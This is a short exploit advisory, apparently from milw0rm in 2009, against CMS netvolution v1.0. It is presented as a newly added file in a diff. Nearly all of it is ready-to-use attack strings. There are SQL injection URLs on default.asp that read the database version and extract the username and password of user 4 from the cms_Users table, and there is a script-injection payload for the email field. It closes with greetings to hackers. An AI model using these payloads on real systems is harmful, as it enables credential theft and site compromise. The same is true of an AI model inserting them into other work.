@@ -1,0 +1,37 @@
+###############################################
+Found By : Ellinas aka Greek                                                  
+Email: ellinas.security@gmail.com                            
+Vulnerable Product: CMS netvolution v1.0                   
+website  : www.netvolution.net , www.atcom.gr           
+##############################################
+
+SQL Injection
+
+Version Finding:
+
+http://site/default.asp?pid=8&la=1&bpe_ac=2&bpe_nid=100%20AND%20SUBSTRING(@@version,1,130)=5
+
+
+Password Finding:
+
+http://site/default.asp?pid=8&la=1&bpe_ac=2&bpe_nid=101%20AND%20
+(select%20(substring(userPassword,1,10000))%20FROM%20cms_Users%20where%20userID=4)%20%3E%20608
+
+
+Username Finding:
+
+http://site/default.asp?pid=8&la=1&bpe_ac=2&bpe_nid=101%20
+AND%20(select%20(substring(userName,1,10000))%20FROM%20cms_Users%20where%20userID=4)%20%3E%20608
+
+Cross Site Scripting
+
+Set the variable email to >"><ScRiPt%20%0a%0d>alert(XSS)%3B</ScRiPt>
+
+
+************************
+Many Greetings to:
+                            
+All Greek Hackers.
+*************************
+
+# milw0rm.com [2009-01-14]
